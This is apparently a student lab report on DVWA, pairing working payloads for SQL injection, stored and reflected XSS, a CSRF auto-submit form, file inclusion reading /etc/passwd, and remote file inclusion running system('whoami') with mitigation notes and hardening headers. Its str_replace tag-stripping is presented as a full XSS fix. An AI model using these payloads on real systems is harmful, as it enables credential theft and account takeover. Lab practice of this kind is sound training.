# Task 3 — Web Application Security: Attack Scenarios & Mitigation Notes

**Target:** DVWA (Damn Vulnerable Web Application) — local Kali Linux lab
**Approach:** Every vulnerability tested at Security Level **Low** (exploit), then re-tested at **High** (mitigation verification), with source code compared via DVWA's "View Source" feature.

---

## 1. SQL Injection

**Attack scenario:** The `SQL Injection` module concatenates raw user input into a SQL query, allowing an attacker to alter query logic.

Payloads used:
```
' OR '1'='1
' ORDER BY 3-- -
' UNION SELECT 1,2-- -
' UNION SELECT user, password FROM users-- -
```

**Impact:** Full extraction of usernames and password hashes from the `users` table.

**Mitigation — Prepared Statements:**
- Low (vulnerable): `"SELECT ... WHERE user_id = '$id';"` — input becomes part of the query.
- High (fixed): `$db->prepare('... WHERE user_id = (?)')` + `bindParam()` — input is always treated as data, never as SQL syntax.

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Stored XSS
**Attack scenario:** The guestbook `Message` field stores raw HTML/JS permanently; it executes for every visitor who views the page.

Payload:
```html
<script>alert(document.cookie)</script>
```

**Impact:** Persistent execution for all users → session cookie theft, defacement.

### 2.2 Reflected XSS
**Attack scenario:** The `name` GET parameter is echoed back into the page unsanitized. A crafted URL can carry the payload directly.

Payload:
```
http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert('Reflected+XSS')</script>#
```

**Impact:** Attacker sends victim a malicious link; script executes in victim's session on click (no persistence needed).

### 2.3 Mitigation — Input Validation + CSP
- Low: raw input inserted into HTML directly.
- High: `str_replace('<script>', '', $input)` strips dangerous tags before rendering (applies to both Stored and Reflected).
- Defense-in-depth: added a Content-Security-Policy header at the server level so even bypassed payloads can't execute inline scripts:
```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

---

## 3. Cross-Site Request Forgery (CSRF)

**Attack scenario:** The password-change function accepts a simple GET request with no verification of request origin.

Malicious auto-submitting page:
```html
<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/" method="GET">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
  <input type="hidden" name="Change" value="Change">
</form>
<script>document.forms[0].submit();</script>
```

**Impact:** Attacker silently changes a logged-in victim's password by getting them to open an unrelated web page.

**Mitigation — Token-Based Protection:**
- Low: no origin/session check at all.
- High: server embeds a unique `user_token` in the legitimate form, tied to the session. Requests missing the correct token are rejected: `"CSRF token is incorrect"`. An attacker's external page cannot read this token due to the browser's Same-Origin Policy.

---

## 4. File Inclusion Attacks

### 4.1 Local File Inclusion (LFI)
Payload:
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=/etc/passwd
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
```
**Impact:** Arbitrary local file read — system files and potentially application config/credentials.

### 4.2 Remote File Inclusion (RFI)
Setup: enabled `allow_url_include` (disabled by default in modern PHP), hosted `evil.txt` via `python3 -m http.server 8000`.

Payload:
```
http://127.0.0.1/dvwa/vulnerabilities/fi/?page=http://127.0.0.1:8000/evil.txt
```
`evil.txt` contents:
```php
<?php echo "RFI Successful - Attacker Code Executed!"; system('whoami'); ?>
```
**Impact:** Full remote code execution as the `www-data` user.

**Recommended mitigation (not a DVWA toggle):**
- Never pass raw user input into `include()`/`require()`.
- Use a server-side allow-list mapping safe identifiers → real filenames.
- Keep `allow_url_include` and `allow_url_fopen` disabled in production.

---

## 5. Burp Suite Advanced

- **Intercept & modify:** Routed Firefox through Burp's proxy (127.0.0.1:8080), captured the DVWA login POST request mid-flight, and altered the `password` parameter before forwarding — demonstrating that client-submitted data can never be trusted at face value.
- **Intruder fuzzing:** Sent the captured request to Intruder, marked the `password` value as the attack position (Sniper attack), loaded a candidate password list, and identified the correct password by the differing response length in the results table.

---

## 6. Web Security Headers

Benchmarked a reference site on securityheaders.com, then inspected DVWA's own headers via DevTools (found missing). Hardened Apache with:

```apache
Header set X-Frame-Options "SAMEORIGIN"
Header set X-Content-Type-Options "nosniff"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"
Header set Content-Security-Policy "default-src 'self'; script-src 'self'"
```

| Header | Purpose |
|---|---|
| X-Frame-Options | Prevents clickjacking via iframe embedding |
| X-Content-Type-Options | Blocks MIME-type sniffing |
| Referrer-Policy | Limits URL leakage to third-party sites |
| Permissions-Policy | Disables unused browser features (camera/mic/geo) |
| Content-Security-Policy | Restricts allowed script/style/image sources — primary XSS defense |

---

## Summary Table

| Vulnerability | Risk | Status | Mitigation Verified |
|---|---|---|---|
| SQL Injection | Critical | Fixed (High) | Prepared Statements |
| XSS — Stored | High | Fixed (High) | Input Validation + CSP |
| XSS — Reflected | High | Fixed (High) | Input Validation + CSP |
| CSRF | High | Fixed (High) | Session-bound Token |
| LFI | High | Recommendation issued | Allow-list (not built into DVWA) |
| RFI | Critical | Recommendation issued | `allow_url_include` disabled |
